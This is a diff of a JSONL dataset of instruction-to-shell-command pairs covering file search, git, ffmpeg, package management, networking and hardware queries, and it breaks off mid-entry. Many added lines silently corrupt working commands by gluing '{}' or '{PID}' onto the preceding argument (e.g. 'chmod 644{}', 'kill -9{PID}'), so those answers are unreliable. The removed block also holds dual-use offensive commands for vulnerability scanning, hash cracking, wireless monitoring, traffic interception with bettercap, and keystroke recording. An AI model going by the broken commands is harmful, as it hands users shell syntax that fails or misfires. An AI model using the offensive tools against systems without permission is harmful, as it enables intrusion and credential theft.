-{"instruction":"Find files with specific permissions and change them","output":"find . -type f -perm 777 -exec chmod 644 {} \\;"}
-{"instruction":"Find files with Windows line endings and convert them to Unix format","output":"find . -type f -exec file {} \\; | grep 'CRLF' | cut -d: -f1 | xargs dos2unix"}
-{"instruction":"Find files with Windows line endings and convert to Unix","output":"find . -type f -exec file {} \\; | grep CRLF | cut -d: -f1 | xargs dos2unix"}
+{"instruction":"Find files with specific permissions and change them","output":"find . -type f -perm 777 -exec chmod 644{} \\;"}
+{"instruction":"Find files with Windows line endings and convert them to Unix format","output":"find . -type f -exec file{} \\; | grep 'CRLF' | cut -d: -f1 | xargs dos2unix"}
+{"instruction":"Find files with Windows line endings and convert to Unix","output":"find . -type f -exec file{} \\; | grep CRLF | cut -d: -f1 | xargs dos2unix"}
 {"instruction":"find large files over 100MB","output":"find . -size +100M"}
 {"instruction":"Find large git objects and show their sizes","output":"git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -10 | awk '{print $1}' | git cat-file --batch-check='%(objectname) %(objecttype) %(objectsize) %(rest)'"}
 {"instruction":"Find largest files in git history","output":"git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize)' | sort -k3nr | head -10"}
 {"instruction":"Find largest git commits in repository history","output":"git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | sed -n 's/^blob //p' | sort -rn -k2 | head -10"}
 {"instruction":"Find largest tables in PostgreSQL database","output":"psql -c 'SELECT nspname || '.' || relname AS relation, pg_size_pretty(pg_total_relation_size(C.oid)) AS total_size FROM pg_class C LEFT JOIN pg_namespace N ON (N.oid = C.relnamespace) WHERE nspname NOT IN ('pg_catalog', 'information_schema') AND C.relkind <> 'i' AND nspname !~ '^pg_toast' ORDER BY pg_total_relation_size(C.oid) DESC LIMIT 10;'"}
-{"instruction":"Find large temporary files older than 3 days","output":"find /tmp -type f -mtime +3 -size +100M -exec ls -lh {} \\;"}
+{"instruction":"Find large temporary files older than 3 days","output":"find /tmp -type f -mtime +3 -size +100M -exec ls -lh{} \\;"}
 {"instruction":"Find processes eating most disk I/O","output":"sudo iotop -o -b -n 1"}
 {"instruction":"Find processes with most threads","output":"ps -eLf | awk '{print $2}' | sort | uniq -c | sort -nr | head"}
-{"instruction":"Find processes with zombie children","output":"ps aux | awk '$8 ~ /Z/ {print $2}'"}
-{"instruction":"Find Python files modified in last week and count lines","output":"find . -name '*.py' -mtime -7 -type f -exec wc -l {} \\;"}
+{"instruction":"Find processes with zombie children","output":"ps aux | awk '$8 ~ /Z/{print $2}'"}
+{"instruction":"Find Python files modified in last week and count lines","output":"find . -name '*.py' -mtime -7 -type f -exec wc -l{} \\;"}
 {"instruction":"Find recent failed cronjob entries","output":"grep CRON /var/log/syslog | grep -i failed | tail -n 20"}
 {"instruction":"find text recursively","output":"grep -r 'text' ."}
 {"instruction":"Find the 10 most recently modified files","output":"find . -type f -printf '%T@ %p\\n' | sort -n | tail -n 10 | awk '{print $2}'"}
-{"instruction":"Find the top 5 most used commands from your history","output":"history | awk '{CMD[$2]++} END {for(a in CMD) print CMD[a], a}' | sort -rn | head -5"}
+{"instruction":"Find the top 5 most used commands from your history","output":"history | awk '{CMD[$2]++} END{for(a in CMD) print CMD[a], a}' | sort -rn | head -5"}
 {"instruction":"flush DNS cache","output":"systemd-resolve --flush-caches"}
-{"instruction":"force kill process","output":"kill -9 {PID}"}
+{"instruction":"force kill process","output":"kill -9{PID}"}
 {"instruction":"Generate a GPG key pair","output":"gpg --full-generate-key"}
 {"instruction":"Generate a list of installed packages and save to a file","output":"dpkg --get-selections > installed_packages.txt"}
 {"instruction":"Generate an SSH key pair","output":"ssh-keygen -t rsa -b 4096 -C 'your_email@example.com'"}
@@ -358,7 +358,7 @@
 {"instruction":"Generate a self-signed SSL certificate using 'openssl'","output":"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem"}
 {"instruction":"Generate bandwidth usage report per IP","output":"tcpdump -nnn -r capture.pcap | awk '{print $3}' | cut -d. -f1,2,3,4 | sort | uniq -c | sort -nr"}
 {"instruction":"Generate CPU load report for the last hour","output":"sar -u 1 3600"}
-{"instruction":"Generate MD5 checksums for all files in a directory","output":"find . -type f -exec md5sum {} ; > checksums.md5"}
+{"instruction":"Generate MD5 checksums for all files in a directory","output":"find . -type f -exec md5sum{} ; > checksums.md5"}
 {"instruction":"Generate SSH key pair for authentication","output":"ssh-keygen -t rsa -b 4096"}
 {"instruction":"Generate tags for code navigation using 'ctags'","output":"ctags -R ."}
 {"instruction":"Generate tags for code navigation using 'exuberant-ctags'","output":"ctags -R ."}
@@ -369,14 +369,14 @@
 {"instruction":"Get load average trends for the last hour","output":"sar -q 60 60"}
 {"instruction":"Get simplified manual pages using 'tldr'","output":"tldr tar"}
 {"instruction":"Get the status of all pods in a Kubernetes cluster","output":"kubectl get pods --all-namespaces"}
-{"instruction":"Get web server response times from log files","output":"awk '{sum+=$NF; count++} END {print \"Average response time: \" sum/count \"s\"}' /var/log/nginx/access.log"}
+{"instruction":"Get web server response times from log files","output":"awk '{sum+=$NF; count++} END{print \"Average response time: \" sum/count \"s\"}' /var/log/nginx/access.log"}
 {"instruction":"Identify processes using a specific file or directory using 'fuser'","output":"fuser -v /path/to/file_or_directory"}
 {"instruction":"Initialize a Terraform working directory","output":"terraform init"}
 {"instruction":"Install a Node.js package globally using 'npm'","output":"sudo npm install -g package_name"}
 {"instruction":"Install a Python package globally using 'pip3'","output":"sudo pip3 install package_name"}
 {"instruction":"Install a Python package using 'pip'","output":"pip install package_name"}
 {"instruction":"Kill all processes named 'process_name'","output":"sudo killall process_name"}
-{"instruction":"kill process by ID","output":"kill {PID}"}
+{"instruction":"kill process by ID","output":"kill{PID}"}
 {"instruction":"List all aliases defined in the current shell","output":"alias"}
 {"instruction":"List all available disk devices and their UUIDs","output":"blkid"}
 {"instruction":"List all connected USB devices","output":"lsusb"}
@@ -384,7 +384,7 @@
 {"instruction":"List all files accessed in the last hour","output":"find . -type f -amin -60"}
 {"instruction":"List all files sorted by modification date, including subdirectories","output":"find . -type f -printf '%T+ %p\\n' | sort"}
 {"instruction":"List all files sorted by size in descending order","output":"ls -lS"}
-{"instruction":"List all files that are larger than 1GB and sort them by size","output":"find . -type f -size +1G -exec ls -lh {} \\; | sort -k5 -h"}
+{"instruction":"List all files that are larger than 1GB and sort them by size","output":"find . -type f -size +1G -exec ls -lh{} \\; | sort -k5 -h"}
 {"instruction":"List all installed Python packages","output":"pip list"}
 {"instruction":"List all installed services and their statuses","output":"systemctl list-unit-files --type=service"}
 {"instruction":"List all listening sockets using 'ss'","output":"ss -tulwn"}
@@ -392,13 +392,13 @@
 {"instruction":"List all open files by a user","output":"sudo lsof -u username"}
 {"instruction":"List all open network connections and their associated processes","output":"sudo lsof -i -P -n"}
 {"instruction":"List all open network ports along with the processes using them","output":"sudo lsof -i -P -n | grep LISTEN"}
-{"instruction":"List all processes and filter those consuming more than 50% CPU","output":"ps aux --sort=-%cpu | awk '$3>50.0 {print $0}'"}
+{"instruction":"List all processes and filter those consuming more than 50% CPU","output":"ps aux --sort=-%cpu | awk '$3>50.0{print $0}'"}
 {"instruction":"List all running Docker containers and their resource usage","output":"docker stats --no-stream"}
 {"instruction":"List all running Docker containers","output":"docker ps"}
 {"instruction":"List all running processes sorted by memory usage","output":"ps aux --sort=-%mem"}
 {"instruction":"List all S3 buckets in your AWS account","output":"aws s3 ls"}
 {"instruction":"List all scheduled cron jobs for all users","output":"for user in $(cut -d: -f1 /etc/passwd); do echo -e \"\\n$user\"; crontab -u \"$user\" -l 2>/dev/null; done"}
-{"instruction":"List all symbolic links pointing to nonexistent files","output":"find . -type l ! -exec test -e {} \\; -print"}
+{"instruction":"List all symbolic links pointing to nonexistent files","output":"find . -type l ! -exec test -e{} \\; -print"}
 {"instruction":"List all users and their login shells","output":"cut -d: -f1,7 /etc/passwd"}
 {"instruction":"List all users with a login shell of '/bin/false'","output":"grep '/bin/false' /etc/passwd | cut -d: -f1"}
 {"instruction":"List open network sockets and their associated processes","output":"sudo netstat -tulpn"}
@@ -410,8 +410,8 @@
 {"instruction":"Monitor CPU temperature in real time","output":"watch -n 1 sensors"}
 {"instruction":"Monitor disk I/O in real time","output":"iostat -xz 1"}
 {"instruction":"Monitor disk I/O usage per process using 'iotop'","output":"sudo iotop"}
-{"instruction":"Monitor disk space and send an alert if usage exceeds 90%","output":"df -h | awk '$5 > 90 {print}' | mail -s 'Disk Space Alert' admin@example.com"}
-{"instruction":"Monitor disk space usage and send alert if over 90%","output":"df -h | awk '$5 > 90 {print $0}' | mail -s 'Disk Space Alert' admin@example.com"}
+{"instruction":"Monitor disk space and send an alert if usage exceeds 90%","output":"df -h | awk '$5 > 90{print}' | mail -s 'Disk Space Alert' admin@example.com"}
+{"instruction":"Monitor disk space usage and send alert if over 90%","output":"df -h | awk '$5 > 90{print $0}' | mail -s 'Disk Space Alert' admin@example.com"}
 {"instruction":"Monitor disk space usage every minute","output":"watch -n 60 df -h"}
 {"instruction":"Monitor disk write operations in real-time","output":"iostat -dx 1 | grep -v '^$' | grep -v 'Device'"}
 {"instruction":"Monitor failed SSH login attempts in real time","output":"tail -f /var/log/auth.log | grep --line-buffered 'Failed password'"}
@@ -469,11 +469,11 @@
 {"instruction":"Recover data from a damaged disk using 'ddrescue'","output":"sudo ddrescue /dev/sdX /path/to/imagefile logfile"}
 {"instruction":"Recursively change the ownership of a directory","output":"chown -R user:group /path/to/directory"}
 {"instruction":"remove directory test","output":"rm -r test"}
-{"instruction":"Replace all instances of 'foo' with 'bar' in all .txt files recursively","output":"find . -type f -name '*.txt' -exec sed -i 's/foo/bar/g' {} ;"}
-{"instruction":"Replace all occurrences of 'foo' with 'bar' in all .txt files","output":"find . -name '*.txt' -type f -exec sed -i 's/foo/bar/g' {} \\;"}
-{"instruction":"Replace all tabs with four spaces in all Python files","output":"find . -name '*.py' -type f -exec sed -i 's/\\t/    /g' {} \\;"}
+{"instruction":"Replace all instances of 'foo' with 'bar' in all .txt files recursively","output":"find . -type f -name '*.txt' -exec sed -i 's/foo/bar/g'{} ;"}
+{"instruction":"Replace all occurrences of 'foo' with 'bar' in all .txt files","output":"find . -name '*.txt' -type f -exec sed -i 's/foo/bar/g'{} \\;"}
+{"instruction":"Replace all tabs with four spaces in all Python files","output":"find . -name '*.py' -type f -exec sed -i 's/\\t/    /g'{} \\;"}
 {"instruction":"Replace spaces with underscores in all filenames in a directory","output":"rename 's/ /_/g' *"}
-{"instruction":"Replace tabs with four spaces in all .py files","output":"find . -name '*.py' -type f -exec sed -i 's/\\t/    /g' {} \\;"}
+{"instruction":"Replace tabs with four spaces in all .py files","output":"find . -name '*.py' -type f -exec sed -i 's/\\t/    /g'{} \\;"}
 {"instruction":"restart service","output":"systemctl restart service_name"}
 {"instruction":"Restore a MySQL database from a compressed backup","output":"gunzip < database_name.sql.gz | mysql -u user -p database_name"}
 {"instruction":"Run a Docker container in interactive mode with a specific image","output":"docker run -it image_name /bin/bash"}
@@ -494,8 +494,8 @@
 {"instruction":"Search for a pattern in files using 'ripgrep'","output":"rg 'pattern' /path/to/search"}
 {"instruction":"Search for a specific pattern in all .log files and display file names and line numbers","output":"grep -rnw 'pattern' --include='*.log' ."}
 {"instruction":"Search for 'error' in all files excluding 'vendor' and 'node_modules' directories","output":"grep -rnw . -e 'error' --exclude-dir={vendor,node_modules}"}
-{"instruction":"Search for lines that contain either 'error' or 'warning' in all log files","output":"find . -name '*.log' -type f -exec grep -iE 'error|warning' {} \\;"}
-{"instruction":"Search for text 'error' in all log files","output":"find . -name '*.log' -type f -exec grep -l 'error' {} \\;"}
+{"instruction":"Search for lines that contain either 'error' or 'warning' in all log files","output":"find . -name '*.log' -type f -exec grep -iE 'error|warning'{} \\;"}
+{"instruction":"Search for text 'error' in all log files","output":"find . -name '*.log' -type f -exec grep -l 'error'{} \\;"}
 {"instruction":"search text in file","output":"grep 'text' file.txt"}
 {"instruction":"Send a GET request to a URL using 'curl'","output":"curl -X GET https://api.example.com/data"}
 {"instruction":"Send an email from the command line","output":"echo 'Email body' | mail -s 'Subject' recipient@example.com"}
@@ -514,7 +514,7 @@
 {"instruction":"show command history","output":"history"}
 {"instruction":"show CPU info","output":"cat /proc/cpuinfo"}
 {"instruction":"show CPU temperature","output":"sensors"}
-{"instruction":"Show CPU usage per Docker container","output":"docker stats --no-stream --format 'table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}'"}
+{"instruction":"Show CPU usage per Docker container","output":"docker stats --no-stream --format 'table{{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}'"}
 {"instruction":"show current directory path","output":"pwd"}
 {"instruction":"show date and time","output":"date"}
 {"instruction":"show directory sizes","output":"du -h"}
@@ -529,7 +529,7 @@
 {"instruction":"show file access times","output":"stat file"}
 {"instruction":"show file content","output":"cat file.txt"}
 {"instruction":"show file differences","output":"diff file1 file2"}
-{"instruction":"show file handles","output":"lsof -p {PID}"}
+{"instruction":"show file handles","output":"lsof -p{PID}"}
 {"instruction":"show file sizes in human readable format","output":"ls -lh"}
 {"instruction":"show file type","output":"file filename"}
 {"instruction":"show firewall rules","output":"iptables -L"}
@@ -549,10 +549,10 @@
 {"instruction":"Show memory usage of each process sorted by size","output":"ps aux --sort=-%mem | awk '{print $4,$11}' | head -n 10"}
 {"instruction":"show me the list of files in this directory","output":"ls ."}
 {"instruction":"show mounted filesystems","output":"mount"}
-{"instruction":"Show MySQL queries taking longer than 1 second","output":"tail -f mysql-slow.log | awk '/Query_time/ {if($3>1) print}'"}
+{"instruction":"Show MySQL queries taking longer than 1 second","output":"tail -f mysql-slow.log | awk '/Query_time/{if($3>1) print}'"}
 {"instruction":"show my username","output":"whoami"}
 {"instruction":"show network interfaces","output":"ifconfig"}
-{"instruction":"Show network interfaces with high packet drops","output":"netstat -i | awk '$7>0 || $8>0 {print $1, \"RX:\", $4, \"TX:\", $8}'"}
+{"instruction":"Show network interfaces with high packet drops","output":"netstat -i | awk '$7>0 || $8>0{print $1, \"RX:\", $4, \"TX:\", $8}'"}
 {"instruction":"show network statistics","output":"netstat -s"}
 {"instruction":"show open files","output":"lsof"}
 {"instruction":"show OS version","output":"cat /etc/os-release"}
@@ -570,7 +570,7 @@
 {"instruction":"show process tree","output":"pstree"}
 {"instruction":"Show programs listening on ports below 1024","output":"sudo lsof -i :1-1024 | grep LISTEN"}
 {"instruction":"Show real-time CPU usage per core","output":"watch -n1 'grep \"^cpu\" /proc/stat | awk \"{print \\$1\\\" \"\\$2+\\$3+\\$4+\\$5+\\$6+\\$7+\\$8 \\\" \"\\$2\\\" \"\\$3\\\" \"\\$4\\\" \"\\$5\\\" \"\\$6\\\" \"\\$7\\\" \"\\$8}\"'"}
-{"instruction":"Show real-time memory consumption change","output":"watch -n 1 'free -m | awk \"/^Mem/ {print \\$3\\\"MB used,\\\" \\$4\\\"MB free,\\\" \\$6\\\"MB cached\\\"} \"'"}
+{"instruction":"Show real-time memory consumption change","output":"watch -n 1 'free -m | awk \"/^Mem/{print \\$3\\\"MB used,\\\" \\$4\\\"MB free,\\\" \\$6\\\"MB cached\\\"} \"'"}
 {"instruction":"Show real-time network bandwidth by process","output":"nethogs"}
 {"instruction":"show routing cache","output":"route -Cn"}
 {"instruction":"show routing table","output":"route -n"}
@@ -597,7 +597,7 @@
 {"instruction":"Show top 10 largest files in directory tree","output":"find . -type f -print0 | xargs -0 du -h | sort -hr | head -n 10"}
 {"instruction":"Show top 10 processes consuming most memory","output":"ps aux --sort=-%mem | head"}
 {"instruction":"Show top memory consumers by process","output":"ps aux --sort=-%mem | head"}
-{"instruction":"Show top memory consumers grouped by user","output":"ps aux | awk '{mem[$1] += $6} END {for (i in mem) print i, mem[i]}' | sort -nk2"}
+{"instruction":"Show top memory consumers grouped by user","output":"ps aux | awk '{mem[$1] += $6} END{for (i in mem) print i, mem[i]}' | sort -nk2"}
 {"instruction":"show USB devices","output":"lsusb"}
 {"instruction":"show user groups","output":"cat /etc/group"}
 {"instruction":"Show worker processes consuming most CPU","output":"ps -eo pcpu,pid,user,args | sort -k 1 -r | head -10"}
@@ -638,503 +638,132 @@
 {"instruction":"Verify MD5 checksums of files using a checksum file","output":"md5sum -c checksums.md5"}
 {"instruction":"View colored log output using 'ccze'","output":"tail -f /var/log/syslog | ccze"}
 {"instruction":"View differences between files with color using 'colordiff'","output":"colordiff file1.txt file2.txt"}
-{
-    "instruction": "Merge multiple JSON files",
-    "output": "jq -s '.' file1.json file2.json > merged.json"
-  },
-  {
-    "instruction": "Show all active network interfaces",
-    "output": "ip link show up"
-  },
-  {
-    "instruction": "Monitor network packets on specific port",
-    "output": "tcpdump -i any port 80"
-  },
-  {
-    "instruction": "Show network interface statistics",
-    "output": "ip -s link"
-  },
-  {
-    "instruction": "Display routing table in detail",
-    "output": "ip route show table all"
-  },
-  {
-    "instruction": "Show network interface queue statistics",
-    "output": "tc -s qdisc show"
-  },
-  {
-    "instruction": "Find files modified in git repository today",
-    "output": "git log --since=midnight --name-only --oneline"
-  },
-  {
-    "instruction": "Show git branch creation date",
-    "output": "git show --no-patch --no-notes --pretty='%ai' branch_name"
-  },
-  {
-    "instruction": "Find largest files in git history",
-    "output": "git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '$1 == \"blob\" {print $3, $4}' | sort -nr | head -10"
-  },
-  {
-    "instruction": "Remove file from git history",
-    "output": "git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch path/to/file' --prune-empty --tag-name-filter cat -- --all"
-  },
-  {
-    "instruction": "Show commits by author",
-    "output": "git log --author=\"username\" --pretty=format:\"%h - %an, %ar : %s\""
-  },
-  {
-    "instruction": "Create SSH key with specific algorithm",
-    "output": "ssh-keygen -t ed25519 -C \"your_email@example.com\""
-  },
-  {
-    "instruction": "Show SSH client configuration",
-    "output": "cat ~/.ssh/config"
-  },
-  {
-    "instruction": "Test SSH connection without logging in",
-    "output": "ssh -T user@hostname"
-  },
-  {
-    "instruction": "Forward local port through SSH tunnel",
-    "output": "ssh -L 8080:localhost:80 user@remote_host"
-  },
-  {
-    "instruction": "Create persistent SSH connection",
-    "output": "ssh -o ServerAliveInterval=60 user@host"
-  },
-  {
-    "instruction": "Extract audio from video file",
-    "output": "ffmpeg -i video.mp4 -vn -acodec copy audio.aac"
-  },
-  {
-    "instruction": "Convert video codec without re-encoding audio",
-    "output": "ffmpeg -i input.mp4 -c:v libx264 -c:a copy output.mp4"
-  },
-  {
-    "instruction": "Create video thumbnail",
-    "output": "ffmpeg -i video.mp4 -ss 00:00:01.000 -vframes 1 thumb.jpg"
-  },
-  {
-    "instruction": "Add subtitles to video",
-    "output": "ffmpeg -i video.mp4 -i subtitles.srt -c copy -c:s mov_text output.mp4"
-  },
-  {
-    "instruction": "Compress video maintaining quality",
-    "output": "ffmpeg -i input.mp4 -vcodec libx264 -crf 23 output.mp4"
-  },
-  {
-    "instruction": "List all available package versions",
-    "output": "apt-cache madison package_name"
-  },
-  {
-    "instruction": "Show package dependencies",
-    "output": "apt-cache depends package_name"
-  },
-  {
-    "instruction": "Find which package provides a file",
-    "output": "dpkg -S /path/to/file"
-  },
-  {
-    "instruction": "Show package installation status",
-    "output": "dpkg -l | grep package_name"
-  },
-  {
-    "instruction": "Clean package cache",
-    "output": "apt-get clean && apt-get autoclean"
-  },
-  {
-    "instruction": "Start Wireshark capture as non-root",
-    "output": "wireshark -k -i any"
-  },
-  {
-    "instruction": "Run network vulnerability scan",
-    "output": "nmap -sV --script vuln target_host"
-  },
-  {
-    "instruction": "Create wordlist from website",
-    "output": "cewl -d 2 -m 5 -w wordlist.txt http://example.com"
-  },
-  {
-    "instruction": "Monitor wireless networks",
-    "output": "airodump-ng wlan0mon"
-  },
-  {
-    "instruction": "Hash cracking with John the Ripper",
-    "output": "john --wordlist=wordlist.txt hashes.txt"
-  },
-  {
-    "instruction": "Show all Bluetooth devices",
-    "output": "bluetoothctl devices"
-  },
-  {
-    "instruction": "Show CPU architecture details",
-    "output": "lscpu | grep 'Architecture\\|Model name\\|CPU(s)'"
-  },
-  {
-    "instruction": "Display system BIOS information",
-    "output": "sudo dmidecode -t bios"
-  },
-  {
-    "instruction": "Show GPU driver version",
-    "output": "nvidia-smi --query-gpu=driver_version --format=csv,noheader"
-  },
-  {
-    "instruction": "Display USB device tree",
-    "output": "lsusb -t"
-  },
-  {
-    "instruction": "Show system power management capabilities",
-    "output": "cat /sys/power/state"
-  },
-  {
-    "instruction": "Hibernate the system",
-    "output": "systemctl hibernate"
-  },
-  {
-    "instruction": "Set system to reboot at specific time",
-    "output": "echo 'shutdown -r' | at 23:00"
-  },
-  {
-    "instruction": "Cancel scheduled shutdown",
-    "output": "shutdown -c"
-  },
-  {
-    "instruction": "Put system in maintenance mode",
-    "output": "systemctl isolate rescue.target"
-  },
-  {
-    "instruction": "Create a new group with specific GID",
-    "output": "groupadd -g 1500 newgroup"
-  },
-  {
-    "instruction": "Lock user account",
-    "output": "passwd -l username"
-  },
-  {
-    "instruction": "Show all users with sudo privileges",
-    "output": "getent group sudo | cut -d: -f4"
-  },
-  {
-    "instruction": "Set user account expiry date",
-    "output": "usermod -e 2024-12-31 username"
-  },
-  {
-    "instruction": "Force user to change password at next login",
-    "output": "chage -d 0 username"
-  },
-  {
-    "instruction": "Find files with broken ACL",
-    "output": "getfacl -R / 2>/dev/null | grep -B1 'Permission denied'"
-  },
-  {
-    "instruction": "Show files accessed in last hour recursively",
-    "output": "find . -type f -amin -60 -ls"
-  },
-  {
-    "instruction": "Create file with specific timestamp",
-    "output": "touch -t 202401011200 filename"
-  },
-  {
-    "instruction": "Find files with specific extension and compress them",
-    "output": "find . -name '*.log' -exec gzip {} \\;"
-  },
-  {
-    "instruction": "Batch rename files with regex",
-    "output": "rename 's/\.jpeg$/.jpg/' *.jpeg"
-  },
-  {
-    "instruction": "Copy text from terminal to clipboard",
-    "output": "echo 'text' | xclip -selection clipboard"
-  },
-  {
-    "instruction": "Read clipboard content",
-    "output": "xclip -selection clipboard -o"
-  },
-  {
-    "instruction": "Monitor keyboard input events",
-    "output": "sudo showkey -a"
-  },
-  {
-    "instruction": "Clear clipboard contents",
-    "output": "echo -n '' | xclip -selection clipboard"
-  },
-  {
-    "instruction": "Record terminal session",
-    "output": "script terminal_session.log"
-  },
-  {
-    "instruction": "Convert JSON to YAML",
-    "output": "python3 -c 'import sys, yaml, json; print(yaml.dump(json.load(sys.stdin)))'"
-  },
-  {
-    "instruction": "Extract specific JSON field recursively",
-    "output": "jq '.. | .field? | select(. != null)'"
-  },
-  {
-    "instruction": "Validate JSON file",
-    "output": "jq 'empty' file.json"
-  },
-  {
-    "instruction": "Show motherboard model",
-    "output": "dmidecode -t 2 | grep -i product"
-  },
-  {
-    "instruction": "Display RAM timing information",
-    "output": "sudo dmidecode -t memory | grep -i speed"
-  },
-  {
-    "instruction": "Show TPM status",
-    "output": "tpm2_getcap -l"
-  },
-  {
-    "instruction": "Display battery health status",
-    "output": "upower -i /org/freedesktop/UPower/devices/battery_BAT0"
-  },
-  {
-    "instruction": "Show CPU frequency scaling governor",
-    "output": "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"
-  },
-  {
-    "instruction": "Display all PCI Express devices",
-    "output": "lspci -vv | grep -A 10 'Express'"
-  },
-  {
-    "instruction": "Show disk read-ahead value",
-    "output": "blockdev --getra /dev/sda"
-  },
-  {
-    "instruction": "Display NUMA node information",
-    "output": "numactl --hardware"
-  },
-  {
-    "instruction": "Show system interrupt statistics",
-    "output": "cat /proc/interrupts"
-  },
-  {
-    "instruction": "Display active kernel parameters",
-    "output": "sysctl -a"
-  },
-  {
-    "instruction": "Set CPU performance mode",
-    "output": "echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor"
-  },
-  {
-    "instruction": "Enable power saving for USB devices",
-    "output": "echo auto | sudo tee /sys/bus/usb/devices/*/power/control"
-  },
-  {
-    "instruction": "Schedule system wake from suspend",
-    "output": "echo 0 | sudo tee /sys/class/rtc/rtc0/wakealarm && echo $(date '+%s' -d '+ 8 hours') | sudo tee /sys/class/rtc/rtc0/wakealarm"
-  },
-  {
-    "instruction": "Set disk I/O scheduler",
-    "output": "echo deadline | sudo tee /sys/block/sda/queue/scheduler"
-  },
-  {
-    "instruction": "Enable SysRq key",
-    "output": "echo 1 | sudo tee /proc/sys/kernel/sysrq"
-  },
-  {
-    "instruction": "Create user with specific login shell",
-    "output": "useradd -s /bin/zsh -m username"
-  },
-  {
-    "instruction": "Set user process priority limits",
-    "output": "echo 'username hard nice -5' | sudo tee -a /etc/security/limits.conf"
-  },
-  {
-    "instruction": "Add user to multiple groups",
-    "output": "usermod -aG group1,group2,group3 username"
-  },
-  {
-    "instruction": "Show user resource limits",
-    "output": "ulimit -a"
-  },
-  {
-    "instruction": "Set maximum number of user processes",
-    "output": "ulimit -u 5000"
-  },
-  {
-    "instruction": "Find files with specific extended attributes",
-    "output": "find / -xattr -exec getfattr -d {} \\;"
-  },
-  {
-    "instruction": "Create sparse file of specific size",
-    "output": "truncate -s 1G sparsefile"
-  },
-  {
-    "instruction": "Find files with duplicate content ignoring name",
-    "output": "find . -type f -exec md5sum {} \\; | sort | uniq -w32 -dD"
-  },
-  {
-    "instruction": "Set file timestamp to match another file",
-    "output": "touch -r reference_file target_file"
-  },
-  {
-    "instruction": "Find files with specific capability set",
-    "output": "getcap -r / 2>/dev/null"
-  },
-  {
-    "instruction": "Paste clipboard content to specific line in file",
-    "output": "xclip -selection clipboard -o | sed -i '5r /dev/stdin' file.txt"
-  },
-  {
-    "instruction": "Copy file content to primary selection",
-    "output": "xclip -selection primary file.txt"
-  },
-  {
-    "instruction": "Monitor X11 events",
-    "output": "xev"
-  },
-  {
-    "instruction": "Record mouse clicks and keyboard input",
-    "output": "xnee --record --mouse --keyboard --out-file events.xnee"
-  },
-  {
-    "instruction": "Show clipboard managers",
-    "output": "ps aux | grep -i clip"
-  },
-  {
-    "instruction": "Convert JSON to XML",
-    "output": "python3 -c 'import json,sys,xmltodict; print(xmltodict.unparse({\"root\":json.load(sys.stdin)}))"
-  },
-  {
-    "instruction": "Find null values in JSON",
-    "output": "jq 'paths as $p | select(getpath($p) == null) | $p | join(\".\")"
-  },
-  {
-    "instruction": "Compare two JSON files",
-    "output": "diff <(jq -S . file1.json) <(jq -S . file2.json)"
-  },
-  {
-    "instruction": "Extract nested JSON array",
-    "output": "jq '.field[].subfield[]'"
-  },
-  {
-    "instruction": "Convert JSON to line-delimited format",
-    "output": "jq -c '.[]' file.json"
-  },
-  {
-    "instruction": "Show network interface ring buffer size",
-    "output": "ethtool -g eth0"
-  },
-  {
-    "instruction": "Display network interface offload settings",
-    "output": "ethtool -k eth0"
-  },
-  {
-    "instruction": "Show network interface driver information",
-    "output": "ethtool -i eth0"
-  },
-  {
-    "instruction": "Display network interface wake-on-lan status",
-    "output": "ethtool eth0 | grep Wake-on"
-  },
-  {
-    "instruction": "Show network interface pause frame settings",
-    "output": "ethtool -a eth0"
-  },
-  {
-    "instruction": "Find commits touching specific function",
-    "output": "git log -L :function_name:file.c"
-  },
-  {
-    "instruction": "Show commit history for specific lines",
-    "output": "git log -L10,20:file.txt"
-  },
-  {
-    "instruction": "Find first commit that introduced a string",
-    "output": "git log -S 'string' --source --all"
-  },
-  {
-    "instruction": "Show commits that moved a file",
-    "output": "git log --follow --name-status -- file.txt"
-  },
-  {
-    "instruction": "Find commits between two tags",
-    "output": "git log tag1..tag2 --oneline"
-  },
-  {
-    "instruction": "Generate SSH key with custom comment",
-    "output": "ssh-keygen -t rsa -b 4096 -C 'custom comment'"
-  },
-  {
-    "instruction": "Create SSH key with specific output file",
-    "output": "ssh-keygen -t ed25519 -f ~/.ssh/custom_key"
-  },
-  {
-    "instruction": "Show SSH key fingerprint",
-    "output": "ssh-keygen -lf ~/.ssh/id_rsa.pub"
-  },
-  {
-    "instruction": "Change SSH key passphrase",
-    "output": "ssh-keygen -p -f ~/.ssh/id_rsa"
-  },
-  {
-    "instruction": "Convert SSH key format",
-    "output": "ssh-keygen -e -f ~/.ssh/id_rsa > openssh_key"
-  },
-  {
-    "instruction": "Adjust video playback speed",
-    "output": "ffmpeg -i input.mp4 -filter:v \"setpts=0.5*PTS\" output.mp4"
-  },
-  {
-    "instruction": "Extract specific video segment",
-    "output": "ffmpeg -i input.mp4 -ss 00:01:00 -t 00:02:00 -c copy output.mp4"
-  },
-  {
-    "instruction": "Convert video to animated GIF",
-    "output": "ffmpeg -i input.mp4 -vf \"fps=10,scale=320:-1\" output.gif"
-  },
-  {
-    "instruction": "Add watermark to video",
-    "output": "ffmpeg -i input.mp4 -i watermark.png -filter_complex 'overlay=10:10' output.mp4"
-  },
-  {
-    "instruction": "Combine multiple videos",
-    "output": "ffmpeg -f concat -i list.txt -c copy output.mp4"
-  },
-  {
-    "instruction": "List available package architectures",
-    "output": "dpkg --print-architecture && dpkg --print-foreign-architectures"
-  },
-  {
-    "instruction": "Show package installation size",
-    "output": "apt-cache show package_name | grep 'Size'"
-  },
-  {
-    "instruction": "Find reverse package dependencies",
-    "output": "apt-cache rdepends package_name"
-  },
-  {
-    "instruction": "Show package version policy",
-    "output": "apt-cache policy package_name"
-  },
-  {
-    "instruction": "List manually installed packages",
-    "output": "apt-mark showmanual"
-  },
-  {
-    "instruction": "Set up wireless network monitor mode",
-    "output": "airmon-ng start wlan0"
-  },
-  {
-    "instruction": "Analyze HTTP traffic with bettercap",
-    "output": "sudo bettercap -iface eth0"
-  },
-  {
-    "instruction": "Scan for SQL injection vulnerabilities",
